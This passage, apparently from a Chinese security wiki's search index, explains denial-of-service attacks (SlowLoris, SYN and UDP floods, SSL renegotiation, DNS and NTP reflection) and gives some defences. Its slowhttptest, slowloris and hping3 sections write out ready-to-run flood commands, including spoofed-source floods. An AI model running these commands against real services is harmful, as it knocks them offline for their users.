Header\u6a21\u5f0f -X Slow Read\u6a21\u5f0f -g \u751f\u6210\u7edf\u8ba1\u4fe1\u606f -o \u6307\u5b9a\u8f93\u51fa\u6587\u4ef6\u540d -v \u65e5\u5fd7\u7b49\u7ea7 -c \u5efa\u7acb\u7684\u8fde\u63a5\u6570\uff0c\u9ed8\u8ba4\u4e3a50 -i \u5728SlowLoris\u548cSlow Post\u6a21\u5f0f\u4e2d\uff0c\u6570\u636e\u53d1\u9001\u7684\u95f4\u9694\uff0c\u9ed8\u8ba4\u4e3a10 -l \u6d4b\u8bd5\u7ef4\u6301\u65f6\u95f4\uff0c\u9ed8\u8ba4\u4e3a240 -r \u6bcf\u79d2\u8fde\u63a5\u4e2a\u6570\uff0c\u9ed8\u8ba4\u4e3a50 -s \u58f0\u660eContent-Length header\u503c\uff0c\u9ed8\u8ba4\u4e3a4096 -t http verb\u5728\u8bf7\u6c42\u65f6\u4f7f\u7528\u4ec0\u4e48\u64cd\u4f5c\uff0c\u9ed8\u8ba4\u4e3aGET -u \u6307\u5b9a\u76ee\u6807URL -x \u5728SlowLoris\u548cSlow Post\u6a21\u5f0f\u4e2d\uff0c\u6307\u5b9a\u53d1\u9001\u7684\u6700\u5927\u6570\u636e\u5c42\u822a\u90fd -y \u5728Slow Read\u6a21\u5f0f\u4e2d\u6307\u5b9atcp\u7a97\u53e3\u8303\u56f4\u4e0a\u9650\uff0c\u9ed8\u8ba4\u4e3a32 -f \u6307\u5b9aContent-Type Header\uff0c\u9ed8\u8ba4\u4e3aapplication/x-www-form-urlencoded -m \u6307\u5b9aAccept Header\uff0c\u9ed8\u8ba4\u4e3atext/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 -d \u4e3a\u6240\u6709\u8fde\u63a5\u6307\u5b9a\u4ee3\u7406 -e \u4e3a\u63a2\u6d4b\u8fde\u63a5\u6307\u5b9a\u4ee3\u7406 -p \u6307\u5b9a\u7b49\u5f85\u65f6\u95f4\u6765\u786e\u8ba4\u653b\u51fb\u5df2\u7ecf\u6210\u529f SlowHTTPTest\u4f7f\u7528\u6848\u4f8b # slowloris\u6a21\u5f0f slowhttptest -c 1000 -H -g -o my_header_stats -i 10 -r 200 -t GET -u URL -x 24 -p 3 # slowpost\u6a21\u5f0f slowhttptest -c 3000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t POST -u URL -x 10 -p 3 # slowread\u6a21\u5f0f slowhttptest -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u URL -p 3 slowloris slowloris\u5b89\u88c5 # pip\u5b89\u88c5 pip3 install slowloris slowloris example.com # git\u4e0b\u8f7d git clone https://github.com/gkbrk/slowloris.git cd slowloris python3 slowloris.py example.com slwoloris\u4f7f\u7528 -p PORT \u6307\u5b9a\u7aef\u53e3\uff0c\u9ed8\u8ba480 -s SOCKETS \u5957\u63a5\u5b57\u6570\u91cf\uff0c\u9ed8\u8ba4150 -v \u589e\u52a0\u65e5\u5fd7\u8bb0\u5f55 -ua \u5bf9\u6bcf\u4e2a\u8bf7\u6c42\u968f\u673a\u5316UA\u53c2\u6570 --proxy-host PROXY_HOST SocketS5\u4ee3\u7406\u4e3b\u673a\uff0c\u9ed8\u8ba4127.0.0.1 --porxy-port PROXY_PORT SocketS5\u4ee3\u7406\u7aef\u53e3\uff0c\u9ed8\u8ba48080 --https \u5bf9\u8bf7\u6c42\u4f7f\u7528https # SocketS5\u4ee3\u7406\u652f\u6301\uff0c\u9700\u8981\u989d\u5916\u5b89\u88c5PySocks Python\u6a21\u5757 pip3 install PySocks slwoloris\u4f7f\u7528\u6848\u4f8b python slowloris.py IP # \u653b\u51fbhttp 80\u7aef\u53e3 python slowloris.py -p 443 --https IP # \u653b\u51fbhttps 443\u7aef\u53e3 CC\u653b\u51fb\u9632\u5fa1 \u5224\u65adUA\u5b57\u6bb5\uff08\u4e0d\u53ef\u9760\uff0c\u53ef\u4ee5\u968f\u610f\u6784\u9020\u7ed5\u8fc7\uff09\uff1b \u7f51\u9875\u4e2d\u5d4c\u5165JS\u4ee3\u7801\uff08\u4e0d\u53ef\u9760\uff0c\u722c\u866b\u53ef\u4ee5\u643a\u5e26\u6d4f\u89c8\u5668\u5f15\u64ce\uff0c\u6216\u8005\u52a0\u8f7dJS\uff09\uff1b \u9488\u5bf9IP+Cookie\u9650\u5236\u8bbf\u95ee\u9891\u7387\uff08\u4e0d\u53ef\u9760\uff0cCookie\u53ef\u4ee5\u4f2a\u9020\uff0cIP\u5b58\u5728\u4ee3\u7406\u6c60\u95ee\u9898\uff09\uff1b \u5173\u95edApache\u6700\u5927\u8fde\u63a5\u6570\u7b49\uff0c\u5408\u7406\u914d\u7f6e\u4e2d\u95f4\u4ef6\uff0c\u7f13\u89e3DDoS\u653b\u51fb\uff1b \u9875\u9762\u4e2d\u6dfb\u52a0\u9a8c\u8bc1\u7801\uff1b \u5408\u7406\u4f18\u5316\u4ee3\u7801\uff0c\u5408\u7406\u4f7f\u7528\u7f13\u5b58\u6280\u672f\uff0c\u51cf\u5c11\u6570\u636e\u5e93\u7684\u8bfb\u5199\u64cd\u4f5c\uff1b","title":"\u5e94\u7528\u5c42\u62d2\u7edd\u670d\u52a1\u653b\u51fb"},{"location":"infrastructure-security/network-security/cc-dos-ddos/cc/#_1","text":"CC\uff08Chanllenge Collapsar\uff09\uff1aCC\u5c31\u662fDDoS\u7684\u4e00\u79cd\u3002 \u901a\u8fc7\u63a7\u5236\u67d0\u4e9b\u4e3b\u673a\u8865\u4e01\u53d1\u9001\u5927\u91cf\u6570\u636e\u5305\u7ed9\u670d\u52a1\u5668\u9020\u6210\u670d\u52a1\u5668\u8d44\u6e90\u8017\u5c3d\uff0c\u4e00\u76f4\u5230\u5b95\u673a\u5d29\u6e83\uff0c\u5e38\u7528\u4e8e\u653b\u51fb\u9875\u9762\u3002","title":"\u5e94\u7528\u5c42\u62d2\u7edd\u670d\u52a1\u653b\u51fb"},{"location":"infrastructure-security/network-security/cc-dos-ddos/cc/#_2","text":"","title":"\u5e94\u7528\u5c42\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u5206\u7c7b"},{"location":"infrastructure-security/network-security/cc-dos-ddos/cc/#get-flood","text":"\u76f4\u63a5\u5bf9\u8f83\u4e3a\u6d88\u8017\u8d44\u6e90\u7684URL\u8fdb\u884c\u5927\u91cf\u7684\u8bf7\u6c42\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u591a\u4e2aURL\u5e76\u53d1\uff0c\u5355\u4e00URL\u5e76\u53d1\u8bf7\u6c42\uff0c\u968f\u673aURL\u8bf7\u6c42\u7b49\u3002","title":"Get-Flood"},{"location":"infrastructure-security/network-security/cc-dos-ddos/cc/#slowloris","text":"\u4e5f\u79f0\u4e3aslow headers\uff0c\u653b\u51fb\u8005\u59cb\u7ec8\u6784\u9020\u4e0d\u5b8c\u6574\u7684http header\u53d1\u9001\uff0c\u540c\u65f6\u8fd8\u95f4\u9694\u4e00\u5b9a\u65f6\u95f4\u518d\u53d1\u9001\u6570\u636e\uff0c\u5bfc\u81f4\u670d\u52a1\u5668\u4e00\u76f4\u5904\u4e8e\u7b49\u5f85\u72b6\u6001\u3002","title":"SlowLoris"},{"location":"infrastructure-security/network-security/cc-dos-ddos/cc/#slowpost","text":"\u4e5f\u79f0\u4e3aslow body\uff0c\u653b\u51fb\u7684\u91cd\u70b9\u5728POST\u6570\u636e\u4e0a\uff0c\u901a\u8fc7\u5c06HTTP Header\u4e2d\u7684Content-Length\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u8f83\u5927\u7684\u503c\uff0c\u540c\u65f6\u8fd8\u95f4\u9694\u4e00\u5b9a\u65f6\u95f4\u518d\u53d1\u9001\u6570\u636e\uff0c\u5bfc\u81f4\u670d\u52a1\u5668\u4e00\u76f4\u5904\u4e8e\u7b49\u5f85\u72b6\u6001\u4e2d\u3002","title":"SlowPost"},{"location":"infrastructure-security/network-security/cc-dos-ddos/cc/#slowread","text":"\u628awindow\u7a97\u53e3\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u975e\u5e38\u5c0f\u7684\u503c\uff0c\u8ba9\u670d\u52a1\u5668\u59cb\u7ec8\u51c6\u5907\u56de\u5e94\u6570\u636e\u3002","title":"SlowRead"},{"location":"infrastructure-security/network-security/cc-dos-ddos/cc/#hashdos","text":"","title":"HashDos"},{"location":"infrastructure-security/network-security/cc-dos-ddos/cc/#_3","text":"","title":"\u6d4b\u8bd5\u5de5\u5177"},{"location":"infrastructure-security/network-security/cc-dos-ddos/cc/#slowhttptest","text":"github\u5730\u5740 Centos7\u7f16\u8bd1\u5b89\u88c5SlowHTTPTest yum install gcc.x86_64 gcc-c++.x86_64 openssl-devel.x86_64 -y yum install automake.noarch autoconf.noarch -y git clone https://github.com/shekyan/slowhttptest cd slowhttptest ./configure autoreconf -ivf make make install SlowHTTPTest\u4f7f\u7528 -H SlowLoris\u6a21\u5f0f -B SlowPost\u6a21\u5f0f -R Range Header\u6a21\u5f0f -X Slow Read\u6a21\u5f0f -g \u751f\u6210\u7edf\u8ba1\u4fe1\u606f -o \u6307\u5b9a\u8f93\u51fa\u6587\u4ef6\u540d -v \u65e5\u5fd7\u7b49\u7ea7 -c \u5efa\u7acb\u7684\u8fde\u63a5\u6570\uff0c\u9ed8\u8ba4\u4e3a50 -i \u5728SlowLoris\u548cSlow Post\u6a21\u5f0f\u4e2d\uff0c\u6570\u636e\u53d1\u9001\u7684\u95f4\u9694\uff0c\u9ed8\u8ba4\u4e3a10 -l \u6d4b\u8bd5\u7ef4\u6301\u65f6\u95f4\uff0c\u9ed8\u8ba4\u4e3a240 -r \u6bcf\u79d2\u8fde\u63a5\u4e2a\u6570\uff0c\u9ed8\u8ba4\u4e3a50 -s \u58f0\u660eContent-Length header\u503c\uff0c\u9ed8\u8ba4\u4e3a4096 -t http verb\u5728\u8bf7\u6c42\u65f6\u4f7f\u7528\u4ec0\u4e48\u64cd\u4f5c\uff0c\u9ed8\u8ba4\u4e3aGET -u \u6307\u5b9a\u76ee\u6807URL -x \u5728SlowLoris\u548cSlow Post\u6a21\u5f0f\u4e2d\uff0c\u6307\u5b9a\u53d1\u9001\u7684\u6700\u5927\u6570\u636e\u5c42\u822a\u90fd -y \u5728Slow Read\u6a21\u5f0f\u4e2d\u6307\u5b9atcp\u7a97\u53e3\u8303\u56f4\u4e0a\u9650\uff0c\u9ed8\u8ba4\u4e3a32 -f \u6307\u5b9aContent-Type Header\uff0c\u9ed8\u8ba4\u4e3aapplication/x-www-form-urlencoded -m \u6307\u5b9aAccept Header\uff0c\u9ed8\u8ba4\u4e3atext/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 -d \u4e3a\u6240\u6709\u8fde\u63a5\u6307\u5b9a\u4ee3\u7406 -e \u4e3a\u63a2\u6d4b\u8fde\u63a5\u6307\u5b9a\u4ee3\u7406 -p \u6307\u5b9a\u7b49\u5f85\u65f6\u95f4\u6765\u786e\u8ba4\u653b\u51fb\u5df2\u7ecf\u6210\u529f SlowHTTPTest\u4f7f\u7528\u6848\u4f8b # slowloris\u6a21\u5f0f slowhttptest -c 1000 -H -g -o my_header_stats -i 10 -r 200 -t GET -u URL -x 24 -p 3 # slowpost\u6a21\u5f0f slowhttptest -c 3000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t POST -u URL -x 10 -p 3 # slowread\u6a21\u5f0f slowhttptest -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u URL -p 3","title":"SlowHTTPTest"},{"location":"infrastructure-security/network-security/cc-dos-ddos/cc/#slowloris_1","text":"slowloris\u5b89\u88c5 # pip\u5b89\u88c5 pip3 install slowloris slowloris example.com # git\u4e0b\u8f7d git clone https://github.com/gkbrk/slowloris.git cd slowloris python3 slowloris.py example.com slwoloris\u4f7f\u7528 -p PORT \u6307\u5b9a\u7aef\u53e3\uff0c\u9ed8\u8ba480 -s SOCKETS \u5957\u63a5\u5b57\u6570\u91cf\uff0c\u9ed8\u8ba4150 -v \u589e\u52a0\u65e5\u5fd7\u8bb0\u5f55 -ua \u5bf9\u6bcf\u4e2a\u8bf7\u6c42\u968f\u673a\u5316UA\u53c2\u6570 --proxy-host PROXY_HOST SocketS5\u4ee3\u7406\u4e3b\u673a\uff0c\u9ed8\u8ba4127.0.0.1 --porxy-port PROXY_PORT SocketS5\u4ee3\u7406\u7aef\u53e3\uff0c\u9ed8\u8ba48080 --https \u5bf9\u8bf7\u6c42\u4f7f\u7528https # SocketS5\u4ee3\u7406\u652f\u6301\uff0c\u9700\u8981\u989d\u5916\u5b89\u88c5PySocks Python\u6a21\u5757 pip3 install PySocks slwoloris\u4f7f\u7528\u6848\u4f8b python slowloris.py IP # \u653b\u51fbhttp 80\u7aef\u53e3 python slowloris.py -p 443 --https IP # \u653b\u51fbhttps 443\u7aef\u53e3","title":"slowloris"},{"location":"infrastructure-security/network-security/cc-dos-ddos/cc/#cc","text":"\u5224\u65adUA\u5b57\u6bb5\uff08\u4e0d\u53ef\u9760\uff0c\u53ef\u4ee5\u968f\u610f\u6784\u9020\u7ed5\u8fc7\uff09\uff1b \u7f51\u9875\u4e2d\u5d4c\u5165JS\u4ee3\u7801\uff08\u4e0d\u53ef\u9760\uff0c\u722c\u866b\u53ef\u4ee5\u643a\u5e26\u6d4f\u89c8\u5668\u5f15\u64ce\uff0c\u6216\u8005\u52a0\u8f7dJS\uff09\uff1b \u9488\u5bf9IP+Cookie\u9650\u5236\u8bbf\u95ee\u9891\u7387\uff08\u4e0d\u53ef\u9760\uff0cCookie\u53ef\u4ee5\u4f2a\u9020\uff0cIP\u5b58\u5728\u4ee3\u7406\u6c60\u95ee\u9898\uff09\uff1b \u5173\u95edApache\u6700\u5927\u8fde\u63a5\u6570\u7b49\uff0c\u5408\u7406\u914d\u7f6e\u4e2d\u95f4\u4ef6\uff0c\u7f13\u89e3DDoS\u653b\u51fb\uff1b \u9875\u9762\u4e2d\u6dfb\u52a0\u9a8c\u8bc1\u7801\uff1b \u5408\u7406\u4f18\u5316\u4ee3\u7801\uff0c\u5408\u7406\u4f7f\u7528\u7f13\u5b58\u6280\u672f\uff0c\u51cf\u5c11\u6570\u636e\u5e93\u7684\u8bfb\u5199\u64cd\u4f5c\uff1b","title":"CC\u653b\u51fb\u9632\u5fa1"},{"location":"infrastructure-security/network-security/cc-dos-ddos/dos-ddos/","text":"\u62d2\u7edd\u670d\u52a1\u653b\u51fb DoS\uff08Denial of Service\uff09\uff1a\u62d2\u7edd\u670d\u52a1 \u901a\u8fc7\u5bf9\u4e3b\u673a\u7279\u5b9a\u6f0f\u6d1e\u7684\u5229\u7528\u653b\u51fb\u5bfc\u81f4\u7f51\u7edc\u6808\u5931\u6548\u3001\u7cfb\u7edf\u5954\u6e83\u3001\u4e3b\u673a\u6b7b\u673a\u7b49\u800c\u65e0\u6cd5\u63d0\u4f9b\u6b63\u5e38\u7684\u7f51\u7edc\u670d\u52a1\u529f\u80fd\uff0c\u4ece\u800c\u9020\u6210\u62d2\u7edd\u670d\u52a1\u3002 DDoS\uff08Distributed Denial of Service\uff09\uff1a\u5206\u5e03\u5f0f\u62d2\u7edd\u670d\u52a1 \u901a\u8fc7\u5f88\u591a\"\u50f5\u5c38\u4e3b\u673a\"\u5411\u53d7\u5bb3\u4e3b\u673a\u53d1\u9001\u5927\u91cf\u770b\u4f3c\u6b63\u5e38\u7684\u7f51\u7edc\u5305\uff0c\u4ece\u800c\u9020\u6210\u7f51\u7edc\u963b\u585e\u6216\u670d\u52a1\u5668\u8d44\u6e90\u8017\u5c3d\u800c\u5bfc\u81f4\u62d2\u7edd\u670d\u52a1\u3002 \u62d2\u7edd\u670d\u52a1\u653b\u51fb\u5206\u7c7b \u7f51\u7edc\u5c42\u653b\u51fb UDP-Flood \u7531\u4e8eUDP\u534f\u8bae\u662f\u4e00\u79cd\u65e0\u8fde\u63a5\u7684\u670d\u52a1\uff0c\u5728UDPFLOOD\u653b\u51fb\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u53d1\u9001\u5927\u91cf\u4f2a\u9020\u6e90IP\u5730\u5740\u7684\u5c0fUDP\u5305\u3002\u4f46\u662f\uff0c\u7531\u4e8eUDP\u534f\u8bae\u662f\u65e0\u8fde\u63a5\u6027\u7684\uff0c\u6240\u4ee5\u53ea\u8981\u5f00\u4e86\u4e00\u4e2aUDP\u7684\u7aef\u53e3\u63d0\u4f9b\u76f8\u5173\u670d\u52a1\u7684\u8bdd\uff0c\u90a3\u4e48\u5c31\u53ef\u9488\u5bf9\u76f8\u5173\u7684\u670d\u52a1\u8fdb\u884c\u653b\u51fb\u3002-- \u767e\u5ea6\u767e\u79d1 \u9632\u5fa1\u6280\u5de7\uff1a \u6458\u81ea \u767e\u5ea6\u767e\u79d1 \u653b\u51fb\u4e1a\u52a1\u7aef\u53e3\uff1a\u6839\u636e\u8be5\u4e1a\u52a1UDP\u6700\u5927\u5305\u957f\u8bbe\u7f6eUDP\u6700\u5927\u5305\u5927\u5c0f\u4ee5\u8fc7\u6ee4\u5f02\u5e38\u6d41\u91cf\u3002 \u653b\u51fb\u975e\u4e1a\u52a1\u7aef\u53e3\uff1a \u4e00\u4e2a\u662f\u4e22\u5f03\u6240\u6709UDP\u5305\uff0c\u53ef\u80fd\u4f1a\u8bef\u4f24\u6b63\u5e38\u4e1a\u52a1\u3002 \u4e00\u4e2a\u662f\u5efa\u7acbUDP\u8fde\u63a5\u89c4\u5219\uff0c\u8981\u6c42\u6240\u6709\u53bb\u5f80\u8be5\u7aef\u53e3\u7684UDP\u5305\uff0c\u5fc5\u987b\u9996\u5148\u4e0eTCP\u7aef\u53e3\u5efa\u7acbTCP\u8fde\u63a5\uff0c\u9700\u8981\u9632\u706b\u5899\u652f\u6491\u3002 TCP-Flood TCP\u653b\u51fb\u4fd7\u79f0SYN\u6cdb\u6d2a\uff0c\u5229\u7528TCP\u4e09\u6b21\u63e1\u624b\u534f\u8bae\u6765\u653b\u51fb\u8ba1\u7b97\u673a\uff0c\u4e3b\u8981\u662f\u901a\u8fc7\u4f2a\u9020\u5927\u91cfIP\u7684\u534a\u8fde\u63a5\u53bb\u653b\u51fb\u5bf9\u65b9\u7cfb\u7edf\u3002 ICMP-Flood \u6b7b\u4ea1\u4e4bping\uff0c\u6b63\u5e38ICMP\u534f\u8bae\u6570\u636e\u5305\u4e3a96\u5b57\u8282\uff0c\u653b\u51fb\u8005\u4f7f\u7528\u7684ICMPFlood\u901a\u5e38\u8bbe\u5b9a\u8f83\u5927\u7684\u957f\u5ea6\u3002 \u534f\u8bae\u5c42\u653b\u51fb TCP/UDP/ICMP\u5206\u7247 \u5f53\u534f\u8bae\u6808\u6536\u5230\u5206\u7247\u901a\u77e5\u65f6\uff0c\u9700\u8981\u9884\u7559\u4e00\u5b9a\u7684\u5185\u5b58\u6765\u7ec4\u88c5\u6570\u636e\u5305\uff0c\u653b\u51fb\u8005\u6076\u610f\u4f7f\u7528\u5206\u7247\u529f\u80fd\u65f6\uff0c\u5c31\u4f1a\u5bfc\u81f4\u670d\u52a1\u7aef\u7684\u534f\u8bae\u6808\u8d44\u6e90\u6d88\u8017\u8fc7\u5927\u3002 SYN-Flood \u6b63\u5e38\u6d41\u7a0b\uff1a\u5ba2\u6237\u7aef\u53d1\u9001SYC\uff0c\u670d\u52a1\u7aef\u54cd\u5e94SYN+ACK\uff0c\u5ba2\u6237\u7aef\u56de\u4f20ACK+1\u3002 \u653b\u51fb\u6d41\u7a0b\uff1a\u4f2a\u9020\u4e0d\u5b58\u5728\u7684IP\u53d1\u9001\u8bf7\u6c42\uff0c\u670d\u52a1\u7aef\u63a5\u53d7\u4e0d\u5230ACK+1\uff0c\u4f1a\u6301\u7eed\u53d1\u9001SYN+ACK\uff0c\u540c\u65f6\u4fdd\u6301\u7740\u672a\u5b8c\u6210\u7684\u8fde\u63a5\uff0c\u8fd9\u6837\u5bb9\u6613\u5360\u6ee1\u670d\u52a1\u5668\u7684\u8fde\u63a5\u961f\u5217\u8fbe\u5230\u6548\u679c\u3002 ACK-Flood \u4e0eSYN-Flood\u653b\u51fb\u7c7b\u4f3c\uff0c\u653b\u51fb\u8005\u53d1\u9001ACK\u5305\uff0c\u5982\u679c\u76ee\u6807\u7cfb\u7edf\u5141\u8bb8ACK\u6765\u5efa\u7acb\u8fde\u63a5\u5c31\u5f88\u5bb9\u6613\u5bfc\u81f4\u8fde\u63a5\u8868\u9879\u8d44\u6e90\u8017\u5c3d\uff0c\u540c\u65f6\u534f\u8bae\u6808\u8fd8\u4f1a\u53d1\u73b0\u8fd9\u7c7b\u6570\u636e\u5305\u4e0d\u5408\u6cd5\u548c\u54cd\u5e94reset\u5305\uff0c\u5bfc\u81f4\u7cfb\u7edf\u8d44\u6e90\u6d88\u8017\u8fc7\u5927\u3002 zeroWindow \u5efa\u7acb\u8fde\u63a5\u540e\uff0c\u53d1\u9001\u6570\u636e\u8bf7\u6c42\uff0c\u670d\u52a1\u7aef\u51c6\u5907\u597d\u6570\u636e\u65f6\uff0c\u653b\u51fb\u8005\u53d1\u9001ack\u5305\u6307\u5b9awindow\u5927\u5c0f\u4e3a0\uff0c\u8fd9\u662f\u670d\u52a1\u7aef\u65e0\u6cd5\u53d1\u9001\u6570\u636e\u5904\u4e8e\u7b49\u5f85\u72b6\u6001\uff0c\u901a\u8fc7\u5efa\u7acb\u5927\u91cf\u8fd9\u6837\u7684\u8fde\u63a5\u6765\u6d88\u8017\u670d\u52a1\u7aef\u8d44\u6e90\u3002 Connection-Flood \u4ec5\u5efa\u7acb\u8fde\u63a5\u4e0d\u53d1\u9001\u6570\u636e\uff0c\u7531\u4e8e\u670d\u52a1\u5668\u7b49\u5f85\u8d85\u65f6\uff0c\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u5efa\u7acb\u5927\u91cf\u8fd9\u6837\u7684\u8fde\u63a5\uff0c\u5b9e\u73b0\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3002 SSL-Flood \u4e0d\u65ad\u7684\u53d1\u8d77SSL\u63e1\u624b\uff0cSSL\u63e1\u624b\u8fc7\u7a0b\uff0c\u670d\u52a1\u7aef\u6d88\u8017\u7684\u8d44\u6e90\u662f\u5ba2\u6237\u7aef\u768415\u500d\u3002 SSLKeyRenego \u5728\u534f\u5546\u52a0\u5bc6\u7b97\u6cd5\u7684\u65f6\u5019\u670d\u52a1\u7aefCPU\u7684\u6d88\u8017\u662f\u5ba2\u6237\u7aef\u768415\u500d\u5de6\u53f3\uff0c\u800cRenegotiating\u673a\u5236\u53ef\u4ee5\u8ba9\u653b\u51fb\u8005\u5728\u4e00\u4e2aTCP\u8fde\u63a5\u4e2d\u4e0d\u65ad\u8fdb\u884c\u91cd\u65b0\u534f\u5546\uff0c\u5bfc\u81f4\u670d\u52a1\u7aefCPU\u8d44\u6e90\u8017\u5c3d\u3002 \u9632\u5fa1\u6280\u5de7\uff1a \u7981\u7528Renegotiating\u673a\u5236\u6765\u5b9e\u73b0\u9632\u5fa1 \u53cd\u5c04\u653e\u5927\u653b\u51fb \u53cd\u5c04\uff1a\u65e0\u8bbaDNS\u8fd8\u662fNTP\uff0c\u90fd\u662f\u57fa\u4e8eUDP\u534f\u8bae\u7684\uff0c\u5728UDP\u534f\u8bae\u4e2d\u6b63\u5e38\u5ba2\u6237\u7aef\u53d1\u9001\u8bf7\u6c42\u5305\u5230\u670d\u52a1\u7aef\uff0c\u670d\u52a1\u7aef\u8fd4\u56de\u54cd\u5e94\u5305\u5230\u5ba2\u6237\u7aef\uff0c\u4f46\u662fUDP\u534f\u8bae\u662f\u9762\u5411\u65e0\u8fde\u63a5\u7684\uff0c\u6240\u4ee5\u5ba2\u6237\u7aef\u53d1\u9001\u8bf7\u6c42\u5305\u7684\u6e90IP\u5f88\u5bb9\u6613\u8fdb\u884c\u4f2a\u9020\uff0c\u5f53\u628a\u6e90IP\u4fee\u6539\u4e3a\u53d7\u5bb3\u8005\u7684IP\uff0c\u6700\u7ec8\u670d\u52a1\u7aef\u8fd4\u56de\u7684\u54cd\u5e94\u5305\u5c31\u4f1a\u8fd4\u56de\u5230\u53d7\u5bb3\u8005\u7684IP\uff0c\u8fd9\u6837\u5c31\u5f62\u6210\u4e86\u53cd\u5c04\u653b\u51fb\u3002 \u653e\u5927\uff1a\u4e00\u4e2a\u5c0f\u7684\u8bf7\u6c42\u5305\u6700\u7ec8\u4f1a\u53d7\u5230\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u591a\u4e8e\u8bf7\u6c42\u5305\u8bb8\u591a\u500d\u7684\u54cd\u5e94\u5305\uff0c\u8fd9\u6837\u5c31\u8fbe\u5230\u4e86\u56db\u4e24\u62e8\u5343\u65a4\u7684\u6548\u679c\u3002 DNS\u53cd\u5c04 \u5229\u7528\u4e92\u8054\u7f51\u4e0a\u5f00\u653e\u7684DNS\u5730\u67dc\u670d\u52a1\u5668\u4f5c\u4e3a\u653b\u51fb\u6e90\uff0c\u5229\u7528\"\u53cd\u5f39\"\u624b\u6cd5\u653b\u51fb\u76ee\u6807\u673a\u5668\u3002 \u6b63\u5e38\u6d41\u7a0b\uff1a\u6e90IP\u5730\u5740--DNS\u67e5\u8be2--DNS\u670d\u52a1\u5668--DNS\u56de\u590d\u5305--\u6e90IP\u5730\u5740 \u653b\u51fb\u6d41\u7a0b\uff1a\u4f2a\u9020IP\u5730\u5740(\u53d7\u5bb3\u8005IP)--DNS\u67e5\u8be2--DNS\u670d\u52a1\u5668--DNS\u56de\u590d\u5305--\u4f2a\u9020\u7684IP\u5730\u5740(\u653b\u51fb\u76ee\u6807) NTP\u53cd\u5c04 NTP\u5305\u542b\u4e00\u4e2amonlist\u529f\u80fd\uff0c\u4e5f\u88ab\u79f0\u4e3aMON_GETLIST\uff0c\u4e3b\u8981\u7528\u4e8e\u76d1\u63a7NTP\u670d\u52a1\u5668\uff0cNTP\u670d\u52a1\u5668\u54cd\u5e94monlist\u540e\u6094\u8fd4\u56de\u4e0eNTP\u670d\u52a1\u5668\u8fdb\u884c\u8fc7\u65f6\u95f4\u540c\u6b65\u7684\u6700\u540e600\u4e2a\u5ba2\u6237\u7aefIP\uff0c\u54cd\u5e94\u5305\u6309\u7167\u6bcf6\u4e2aIP\u8fdb\u884c\u5206\u5272\uff0c\u6700\u591a\u6709100\u4e2a\u54cd\u5e94\u5305\u3002 SNMP\u53cd\u5c04 SSDP\u53cd\u5c04 Chargen\u53cd\u5c04 \u5176\u5b83\u7c7b\u578b DRDoS DRDoS\uff08Distributed Reflection Denial of Service\uff09\uff1a\u5206\u5e03\u5f0f\u53cd\u5c04\u653b\u51fb ReDoS ReDoS\uff08Regular Expression Denial of Service\uff09\uff1a\u6b63\u5219\u8868\u8fbe\u5f0f\u62d2\u7edd\u670d\u52a1\u653b\u51fb\uff0c\u5f00\u53d1\u4eba\u5458\u4f7f\u7528\u4e86\u6b63\u5219\u8868\u8fbe\u5f0f\u6765\u5bf9\u7528\u6237\u8f93\u5165\u7684\u6570\u636e\u8fdb\u884c\u6709\u6548\u6027\u6821\u9a8c\uff0c\u5f53\u7f16\u5199\u6821\u9a8c\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u5b58\u5728\u7f3a\u9677\u6216\u8005\u4e0d\u4e25\u8c28\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6784\u9020\u7279\u6b8a\u7684\u5b57\u7b26\u4e32\u6765\u5927\u91cf\u6d88\u8017\u670d\u52a1\u5668\u7684\u7cfb\u7edf\u8d44\u6e90\uff0c\u9020\u6210\u670d\u52a1\u5668\u7684\u670d\u52a1\u7ec8\u7aef\u6216\u505c\u6b62\u3002 \u65e0\u7ebfDDoS \u6d4b\u8bd5\u5de5\u5177 hping3 \u5b98\u7f51\u5730\u5740 Centos7\u7f16\u8bd1\u5b89\u88c5\uff0ckali\u81ea\u5e26 # \u89e3\u51b3\u73af\u5883\u4f9d\u8d56 yum install gcc.x86_64 libpcap-devel.x86_64 tcl-devel -y # \u4e0b\u8f7d wget http://www.hping.org/hping3-20051105.tar.gz # \u89e3\u538b\u5e76\u5f00\u59cb\u7f16\u8bd1 tar -xf hping3-20051105.tar.gz cd hping3-20051105 ./configure # \u62a5\u9519\u5982\u56fe # \u4fee\u6539\u6587\u4ef6\uff0c\u4fee\u6539\u5185\u5bb9\u5982\u56fe vim bytesex.h # \u7f16\u8bd1\u5b8c\u6210\uff0c\u8fdb\u884c\u5b89\u88c5 make # \u62a5\u9519\u5982\u56fe # \u94fe\u63a5\u6587\u4ef6 ln -s /usr/include/pcap-bpf.h /usr/include/net/bpf.h # \u518d\u6b21\u5b89\u88c5 make make install hping3\u4f7f\u7528\u6848\u4f8b # \u6d4b\u8bd5SYN Flood hping3 -S --flood -V -p PORT IP hping3 -c 20000 -d 120 -S -w 64 -p PORT --flood --rand-source IP # \u968f\u673a\u6e90IP # \u6d4b\u8bd5UDP Flood hping3 --flood --rand-source --udp -p PORT IP # \u6d4b\u8bd5TCP FIN Flood hping3 --flood --rand-source -F -p PORT IP # \u6d4b\u8bd5TCP RST Flood hping3 --flood --rand-source -R -p PORT IP # \u6d4b\u8bd5PUSH\u548cACK Flood hping3 --flood --rand-source -PA -p PORT IP # \u6d4b\u8bd5ICMP\u548cIGMP Flood hping3 --flood --rand-source -1 -p PORT IP Thc-SSL-DoS Centos7\u7f16\u8bd1\u5b89\u88c5\uff0ckali\u81ea\u5e26 # \u89e3\u51b3\u73af\u5883\u4f9d\u8d56 yum install gcc.x86_64 openssl-devel.x86_64 -y # \u4e0b\u8f7d git clone git://git.kali.org/packages/thc-ssl-dos.git cd 